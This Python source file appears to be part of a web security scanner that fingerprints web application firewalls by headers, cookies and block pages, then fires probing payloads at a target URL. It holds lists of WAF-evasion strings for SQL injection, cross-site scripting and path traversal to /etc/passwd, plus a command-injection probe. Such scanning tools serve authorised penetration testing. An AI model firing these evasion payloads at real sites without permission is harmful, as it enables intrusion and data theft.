"""WAF Detection and Bypass Module"""

import re
import time
import requests
from typing import List, Dict, Any, Optional


class WAFDetector:
    """Web Application Firewall detection and bypass testing"""
    
    def __init__(self, timeout: int = 10, user_agent: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or "WebCross-Scanner/1.0"
        
        # WAF signatures
        self.waf_signatures = {
            # Header-based
            "headers": {
                "cf-ray": "Cloudflare",
                "cf-cache-status": "Cloudflare",
                "x-sucuri-id": "Sucuri",
                "x-sucuri-cache": "Sucuri",
                "x-cdn": "Incapsula",
                "x-iinfo": "Incapsula",
                "x-distil-cs": "Distil Networks",
                "x-akamai-transformed": "Akamai",
                "x-amz-cf-id": "AWS CloudFront",
                "x-azure-ref": "Azure",
                "x-ms-gateway-requestid": "Azure",
                "x-kong-upstream-latency": "Kong",
                "x-varnish": "Varnish",
                "x-dotdefender-denied": "dotDefender",
            },
            # Server header patterns
            "server": {
                "cloudflare": "Cloudflare",
                "sucuri": "Sucuri",
                "barracuda": "Barracuda",
                "bigip": "F5 BIG-IP",
                "fortiweb": "FortiWeb",
                "imperva": "Imperva",
                "safedog": "SafeDog",
            },
            # Cookie patterns
            "cookies": {
                "__cfduid": "Cloudflare",
                "incap_ses": "Incapsula",
                "visid_incap": "Incapsula",
                "sucuri_cloudproxy": "Sucuri",
                "ak_bmsc": "Akamai Bot Manager",
                "bm_sv": "Akamai Bot Manager",
            }
        }
        
        # Block response patterns
        self.block_patterns = [
            (r"access denied", "Generic"),
            (r"blocked by", "Generic"),
            (r"request blocked", "Generic"),
            (r"web application firewall", "Generic"),
            (r"cloudflare", "Cloudflare"),
            (r"cf-ray", "Cloudflare"),
            (r"sucuri", "Sucuri"),
            (r"incapsula", "Incapsula"),
            (r"mod_security", "ModSecurity"),
            (r"modsecurity", "ModSecurity"),
            (r"wordfence", "Wordfence"),
            (r"imunify360", "Imunify360"),
            (r"block.*malicious", "Generic"),
        ]
        
        # Test payloads to trigger WAF
        self.test_payloads = [
            "'OR 1=1--",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "| cat /etc/passwd",
            "${7*7}",
            "{{7*7}}",
        ]
        
        # WAF bypass payloads for common rules
        self.bypass_payloads = {
            "sqli": [
                ("'OR'1'='1", "Quote variation"),
                ("'/**/OR/**/1=1--", "Comment bypass"),
                ("' /*!50000OR*/ 1=1--", "MySQL version comment"),
                ("'%0aOR%0a1=1--", "Newline bypass"),
                ("'+OR+1=1--", "Plus encoding"),
                ("' OR 0x31=0x31--", "Hex encoding"),
            ],
            "xss": [
                ("<svg/onload=alert(1)>", "Tag variation"),
                ("<img src=x onerror=alert`1`>", "Backtick"),
                ("<body/onload=alert(1)>", "Body tag"),
                ("<ScRiPt>alert(1)</ScRiPt>", "Mixed case"),
                ("%3Cscript%3Ealert(1)%3C/script%3E", "URL encoding"),
                ("\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E", "Hex escape"),
            ],
            "lfi": [
                ("....//....//etc/passwd", "Double dot bypass"),
                ("..%252f..%252fetc/passwd", "Double URL encoding"),
                ("..%c0%afetc/passwd", "UTF-8 encoding"),
                ("/etc/passwd%00.jpg", "Null byte"),
            ],
        }
    
    def _make_request(self, url: str, params: Dict = None) -> Optional[requests.Response]:
        try:
            headers = {"User-Agent": self.user_agent}
            return requests.get(url, params=params, headers=headers,
                              timeout=self.timeout, verify=False)
        except Exception:
            return None
    
    def detect_waf(self, url: str) -> List[Dict[str, Any]]:
        """Detect WAF presence"""
        findings = []
        
        # Normal request
        response = self._make_request(url)
        if not response:
            return findings
        
        detected_wafs = set()
        
        # Check headers
        for header, waf_name in self.waf_signatures["headers"].items():
            if header.lower() in [h.lower() for h in response.headers]:
                detected_wafs.add(waf_name)
        
        # Check server header
        server = response.headers.get("Server", "").lower()
        for pattern, waf_name in self.waf_signatures["server"].items():
            if pattern in server:
                detected_wafs.add(waf_name)
        
        # Check cookies
        for cookie in response.cookies:
            for cookie_pattern, waf_name in self.waf_signatures["cookies"].items():
                if cookie_pattern.lower() in cookie.name.lower():
                    detected_wafs.add(waf_name)
        
        # Trigger WAF with malicious payloads
        for payload in self.test_payloads:
            test_url = f"{url}?test={payload}"
            trigger_response = self._make_request(test_url)
            
            if trigger_response:
                # Check for block response
                if trigger_response.status_code in [403, 406, 429, 503]:
                    content = trigger_response.text.lower()
                    for pattern, waf_name in self.block_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            detected_wafs.add(waf_name)
                
                # Check if response differs significantly
                if len(trigger_response.text) < len(response.text) * 0.5:
                    findings.append({
                        "type": "WAF_BLOCK_DETECTED",
                        "payload": payload,
                        "evidence": f"Response shortened (possible block)",
                        "url": url
                    })
        
        # Report detected WAFs
        for waf in detected_wafs:
            findings.append({
                "type": "WAF_DETECTED",
                "waf_name": waf,
                "url": url,
                "evidence": f"Detected {waf} WAF/CDN",
                "confidence": "HIGH"
            })
        
        return findings
    
    def test_bypasses(self, url: str, attack_type: str = "sqli") -> List[Dict[str, Any]]:
        """Test WAF bypass payloads"""
        findings = []
        
        if attack_type not in self.bypass_payloads:
            return findings
        
        # Get baseline (blocked) response
        baseline_payload = self.test_payloads[0]
        baseline_response = self._make_request(f"{url}?test={baseline_payload}")
        
        if not baseline_response:
            return findings
        
        baseline_blocked = baseline_response.status_code in [403, 406, 429]
        
        # Test bypass payloads
        for payload, technique in self.bypass_payloads[attack_type]:
            test_response = self._make_request(f"{url}?test={payload}")
            
            if test_response:
                # Check if bypass worked
                if baseline_blocked and test_response.status_code == 200:
                    findings.append({
                        "type": "WAF_BYPASS_POTENTIAL",
                        "attack_type": attack_type,
                        "payload": payload,
                        "technique": technique,
                        "evidence": f"Payload returned 200 vs baseline 403",
                        "url": url,
                        "confidence": "MEDIUM"
                    })
                
                # Check content difference
                if len(test_response.text) > len(baseline_response.text) * 1.5:
                    findings.append({
                        "type": "WAF_BYPASS_POTENTIAL",
                        "attack_type": attack_type,
                        "payload": payload,
                        "technique": technique,
                        "evidence": "Response significantly larger than blocked baseline",
                        "url": url,
                        "confidence": "LOW"
                    })
        
        return findings
    
    def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """Full WAF scan including detection and bypass testing"""
        findings = []
        
        # Detect WAF
        waf_findings = self.detect_waf(url)
        findings.extend(waf_findings)
        
        # If WAF detected, test bypasses
        if any(f["type"] == "WAF_DETECTED" for f in waf_findings):
            for attack_type in ["sqli", "xss", "lfi"]:
                bypass_findings = self.test_bypasses(url, attack_type)
                findings.extend(bypass_findings)
        
        return findings
